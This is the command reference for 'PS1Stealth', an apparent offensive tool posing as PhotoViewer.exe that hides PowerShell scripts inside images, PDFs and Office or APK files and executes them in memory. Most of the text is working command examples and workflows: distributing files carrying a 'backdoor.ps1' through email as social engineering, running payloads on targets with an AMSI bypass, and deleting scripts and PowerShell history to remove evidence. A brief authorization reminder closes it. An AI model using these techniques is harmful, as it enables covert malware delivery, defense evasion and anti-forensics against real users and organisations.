# PS1Stealth - Command Line Reference

## Quick Reference

```
PhotoViewer.exe <command> [arguments] [options]
```

## Commands

### 1. embed

Embeds a PowerShell script into a carrier file.

**Syntax:**
```powershell
PhotoViewer.exe embed <ps1-file> <carrier-file> <output-file> [options]
```

**Arguments:**
- `ps1-file` - Path to PowerShell script to embed
- `carrier-file` - Path to carrier file (image, PDF, ZIP, etc.)
- `output-file` - Path for output polyglot file

**Options:**
- `--method <method>` - Embedding method (default: ImageLSB)
  - `ImageLSB` - LSB steganography
  - `ImagePolyglot` - ICO polyglot
  - `PdfPolyglot` - PDF stream injection
  - `ZipComment` - ZIP comment field
  - `IcoAtom` - ICO header manipulation
- `--password <password>` - Encryption password (AES-256)
- `--compress <true|false>` - Enable compression (default: true)

**Examples:**
```powershell
# Basic embed
PhotoViewer.exe embed script.ps1 photo.png output.png --method ImageLSB

# With encryption
PhotoViewer.exe embed script.ps1 photo.png output.png --method ImageLSB --password "MySecret123"

# Without compression
PhotoViewer.exe embed script.ps1 photo.png output.png --method ImageLSB --compress false

# PDF polyglot
PhotoViewer.exe embed script.ps1 document.pdf output.pdf --method PdfPolyglot --password "PDFPass"

# ZIP comment (works with DOCX, XLSX, etc.)
PhotoViewer.exe embed script.ps1 report.docx output.docx --method ZipComment --password "DocPass"
```

---

### 2. extract

Extracts a PowerShell script from a polyglot file.

**Syntax:**
```powershell
PhotoViewer.exe extract <input-file> <output-file> [options]
```

**Arguments:**
- `input-file` - Path to polyglot file
- `output-file` - Path for extracted .ps1 file

**Options:**
- `--method <method>` - Extraction method (must match embedding method)
- `--password <password>` - Decryption password (if used)

**Examples:**
```powershell
# Extract without password
PhotoViewer.exe extract output.png script.ps1 --method ImageLSB

# Extract with password
PhotoViewer.exe extract output.png script.ps1 --method ImageLSB --password "MySecret123"

# Extract from PDF
PhotoViewer.exe extract output.pdf script.ps1 --method PdfPolyglot --password "PDFPass"

# Extract from Office document
PhotoViewer.exe extract output.docx script.ps1 --method ZipComment --password "DocPass"
```

---

### 3. execute

Extracts and executes PowerShell script in-memory (no disk writes).

**Syntax:**
```powershell
PhotoViewer.exe execute <input-file> [options]
```

**Arguments:**
- `input-file` - Path to polyglot file

**Options:**
- `--method <method>` - Extraction method
- `--password <password>` - Decryption password (if used)
- `--bypass-amsi` - Attempt AMSI bypass (default: false)

**Examples:**
```powershell
# Execute without password
PhotoViewer.exe execute output.png --method ImageLSB

# Execute with password
PhotoViewer.exe execute output.png --method ImageLSB --password "MySecret123"

# Execute with AMSI bypass
PhotoViewer.exe execute output.png --method ImageLSB --password "MySecret123" --bypass-amsi

# Execute from PDF
PhotoViewer.exe execute output.pdf --method PdfPolyglot --password "PDFPass" --bypass-amsi
```

---

### 4. info

Displays information about embedding methods.

**Syntax:**
```powershell
PhotoViewer.exe info
```

**Example:**
```powershell
PhotoViewer.exe info
```

---

## Embedding Methods Reference

### ImageLSB

**Description:** Least Significant Bit steganography  
**Carrier Files:** PNG, BMP  
**Capacity:** ~1 byte per 8 pixels (high)  
**Detectability:** Low  
**Notes:** Image must be large enough for payload

**Recommendations:**
- Use for large payloads
- Choose high-resolution images
- Enable compression for even larger payloads

**Example:**
```powershell
PhotoViewer.exe embed payload.ps1 photo.png output.png --method ImageLSB --password "secret"
```

---

### ImagePolyglot

**Description:** ICO polyglot file format  
**Carrier Files:** PNG, BMP (converted to ICO)  
**Capacity:** High  
**Detectability:** Low  
**Notes:** Output is ICO format

**Recommendations:**
- Good for icon files
- Works well with any size payload
- File becomes .ico format

**Example:**
```powershell
PhotoViewer.exe embed payload.ps1 image.png output.ico --method ImagePolyglot --password "secret"
```

---

### PdfPolyglot

**Description:** PDF stream object injection  
**Carrier Files:** PDF documents  
**Capacity:** Medium  
**Detectability:** Medium  
**Notes:** PDF remains fully functional

**Recommendations:**
- Ideal for document-based delivery
- PDF remains readable
- Good for social engineering

**Example:**
```powershell
PhotoViewer.exe embed payload.ps1 document.pdf output.pdf --method PdfPolyglot --password "secret"
```

---

### ZipComment

**Description:** ZIP comment field embedding  
**Carrier Files:** ZIP, JAR, APK, DOCX, XLSX, PPTX  
**Capacity:** Up to 65,535 bytes  
**Detectability:** Low  
**Notes:** Works with ZIP-based formats

**Recommendations:**
- Perfect for Office documents
- Works with Android APKs
- Very stealthy

**Example:**
```powershell
PhotoViewer.exe embed payload.ps1 report.docx output.docx --method ZipComment --password "secret"
```

---

### IcoAtom

**Description:** ICO header and padding manipulation  
**Carrier Files:** ICO files  
**Capacity:** Variable (low to high)  
**Detectability:** Low  
**Notes:** Uses header space or appended data

**Recommendations:**
- Good for small payloads in header
- Can append larger payloads
- ICO files remain valid

**Example:**
```powershell
PhotoViewer.exe embed payload.ps1 icon.ico output.ico --method IcoAtom --password "secret"
```

---

## Common Workflows

### Workflow 1: Image-Based Payload

```powershell
# 1. Create PowerShell payload
@"
Write-Host 'Payload executed successfully!'
whoami
"@ | Out-File payload.ps1

# 2. Embed in image with encryption
PhotoViewer.exe embed payload.ps1 photo.png stego.png --method ImageLSB --password "SecurePass2024"

# 3. Distribute stego.png (looks like normal image)

# 4. On target, execute directly
PhotoViewer.exe execute stego.png --method ImageLSB --password "SecurePass2024" --bypass-amsi
```

---

### Workflow 2: Document-Based Payload

```powershell
# 1. Embed in Office document
PhotoViewer.exe embed recon.ps1 Report.docx Report_Final.docx --method ZipComment --password "Office123"

# 2. Document remains fully functional

# 3. Email or upload to shared drive

# 4. On target, extract and execute
PhotoViewer.exe execute Report_Final.docx --method ZipComment --password "Office123"
```

---

### Workflow 3: PDF-Based Payload

```powershell
# 1. Embed in PDF
PhotoViewer.exe embed backdoor.ps1 Whitepaper.pdf Whitepaper_v2.pdf --method PdfPolyglot --password "PDF2024"

# 2. PDF opens normally, looks legitimate

# 3. Distribute via email or web

# 4. Execute hidden payload
PhotoViewer.exe execute Whitepaper_v2.pdf --method PdfPolyglot --password "PDF2024" --bypass-amsi
```

---

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | General error |

---

## Environment Variables

Currently, PS1Stealth doesn't use environment variables, but you can set:

```powershell
# Store password in environment variable (use with caution!)
$env:PS1_PASSWORD = "MySecretPassword"

# Then use in scripts
PhotoViewer.exe embed script.ps1 image.png output.png --method ImageLSB --password $env:PS1_PASSWORD
```

---

## Tips & Tricks

### 1. Batch Processing

```powershell
# Embed multiple scripts
$scripts = Get-ChildItem *.ps1
foreach ($script in $scripts) {
    $output = $script.BaseName + "_embedded.png"
    PhotoViewer.exe embed $script.Name carrier.png $output --method ImageLSB --password "BatchPass"
}
```

### 2. Password Management

```powershell
# Generate strong random password
$password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 20 | ForEach-Object {[char]$_})
Write-Host "Generated password: $password"

PhotoViewer.exe embed script.ps1 image.png output.png --method ImageLSB --password $password
```

### 3. Verify Carrier File Integrity

```powershell
# Check that embedded file still works as original format
Start-Process output.png  # Should open as image
Start-Process output.pdf  # Should open as PDF
```

### 4. Cleanup Operations

```powershell
# Remove all .ps1 files after embedding
Remove-Item *.ps1 -Force

# Clear PowerShell history
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force
```

---

## Troubleshooting

### Error: "No embedded payload found"

**Cause:** Method mismatch or corrupted file  
**Solution:** Ensure --method matches what was used for embedding

```powershell
# Wrong
PhotoViewer.exe embed script.ps1 image.png out.png --method ImageLSB --password "pass"
PhotoViewer.exe extract out.png script.ps1 --method PdfPolyglot --password "pass"  # ❌

# Correct
PhotoViewer.exe embed script.ps1 image.png out.png --method ImageLSB --password "pass"
PhotoViewer.exe extract out.png script.ps1 --method ImageLSB --password "pass"  # ✅
```

---

### Error: "Image too small"

**Cause:** Image doesn't have enough pixels for payload  
**Solution:** Use larger image or enable compression

```powershell
# Option 1: Use larger image
PhotoViewer.exe embed large_script.ps1 hires_photo.png out.png --method ImageLSB

# Option 2: Ensure compression is enabled
PhotoViewer.exe embed large_script.ps1 photo.png out.png --method ImageLSB --compress true

# Option 3: Use different method
PhotoViewer.exe embed large_script.ps1 photo.png out.ico --method ImagePolyglot
```

---

### Error: "Payload is encrypted but no password provided"

**Cause:** Trying to extract encrypted payload without password  
**Solution:** Provide the correct password

```powershell
PhotoViewer.exe extract out.png script.ps1 --method ImageLSB --password "YourPassword"
```

---

### Error: Decryption fails

**Cause:** Wrong password  
**Solution:** Use correct password or extract metadata if available

```powershell
# Make sure password matches exactly (case-sensitive)
PhotoViewer.exe extract out.png script.ps1 --method ImageLSB --password "ExactPassword123"
```

---

## Advanced Usage

### Programmatic Integration

See `README.md` for C# code examples of programmatic usage.

### Custom Embedders

Implement `IEmbedder` interface for custom embedding methods.

---

## Security Reminders

⚠️ **Always:**
- Get authorization before testing
- Use encryption for sensitive payloads
- Document your activities
- Clean up after operations

❌ **Never:**
- Use on unauthorized systems
- Store passwords in plain text
- Leave evidence behind
- Violate laws or ethics

---

**For complete documentation, see README.md**  
**For usage examples, see Examples/USAGE_EXAMPLES.md**  
**For quick start, see QUICKSTART.md**
